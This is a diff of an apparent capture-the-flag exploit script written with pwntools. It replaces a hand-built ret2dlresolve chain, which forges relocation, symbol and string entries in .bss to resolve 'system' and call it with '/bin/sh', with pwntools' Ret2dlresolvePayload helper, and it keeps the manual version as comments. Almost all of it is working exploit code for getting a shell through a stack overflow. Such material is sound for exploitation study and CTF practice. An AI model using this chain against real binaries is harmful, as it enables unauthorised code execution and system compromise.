@@ -90,53 +90,59 @@ payload = flat({
 
 se(payload)
 
-dynsym_offset = ((bss + 0xc) - dynsym) // 0x10
-r_info = (dynsym_offset << 8) | 0x7
+# =======  Normal way without using ret2dlresolve
+#dynsym_offset = ((bss + 0xc) - dynsym) // 0x10
+#r_info = (dynsym_offset << 8) | 0x7
+#
+#dynstr_index = (bss + 28) - dynstr
+#print(hex(dynsym_offset), hex(r_info), hex(dynstr_index))
+#
+#paylaod1 = b""
+#
+## Our .rel.plt entry
+#paylaod1 += p32(elf.got['alarm'])
+#paylaod1 += p32(r_info)
+#
+## Empty
+#paylaod1 += p32(0x0)
+#
+## Our dynsm entry
+#paylaod1 += p32(dynstr_index)
+#paylaod1 += p32(0xde)*3
+#
+## Our dynstr entry
+#paylaod1 += b"system\x00"
+#
+## Store "/bin/sh" here so we can have a pointer ot it
+#paylaod1 += b"/bin/sh\x00"
+#
+#se(paylaod1)
+#binsh_bss_address = bss + 35
+#ret_plt_offset = bss - relplt
+#
+#sleep(1)
+#
+#offset2 = 44
+#payload2 = flat({
+#    offset2: [
+#       # dlresolve,
+#       # ret_plt_offset,
+#       # 0xdeadbeef,
+#       # binsh_bss_address
+#        rop.chain()
+#    ]
+#})
+#
+#se(payload2)
+ret2dlresolve = Ret2dlresolvePayload(elf, 'system', ["/bin/sh"], data_addr=bss)
+rop.ret2dlresolve(ret2dlresolve)
+se(ret2dlresolve.payload)
 
-dynstr_index = (bss + 28) - dynstr
-print(hex(dynsym_offset), hex(r_info), hex(dynstr_index))
-
-paylaod1 = b""
-
-# Our .rel.plt entry
-paylaod1 += p32(elf.got['alarm'])
-paylaod1 += p32(r_info)
-
-# Empty
-paylaod1 += p32(0x0)
-
-# Our dynsm entry
-paylaod1 += p32(dynstr_index)
-paylaod1 += p32(0xde)*3
-
-# Our dynstr entry
-paylaod1 += b"system\x00"
-
-# Store "/bin/sh" here so we can have a pointer ot it
-paylaod1 += b"/bin/sh\x00"
-
-se(paylaod1)
-
-# Our third scan, which will execute the ret_2_dl_resolve
-# This will just call 0x80482f0, which is responsible for calling the functions for resolving
-# We will pass it the `.rel.plt` index for our fake entry
-# As well as the arguments for system
-
-# Calculate address of "/bin/sh"
-binsh_bss_address = bss + 35
-
-# Calculate the .rel.plt offset
-ret_plt_offset = bss - relplt
-
-sleep(1)
 
 offset2 = 44
 payload2 = flat({
     offset2: [
-        dlresolve,
-        ret_plt_offset,
-        0xdeadbeef,
-        binsh_bss_address
+        rop.chain()
     ]
 })
 
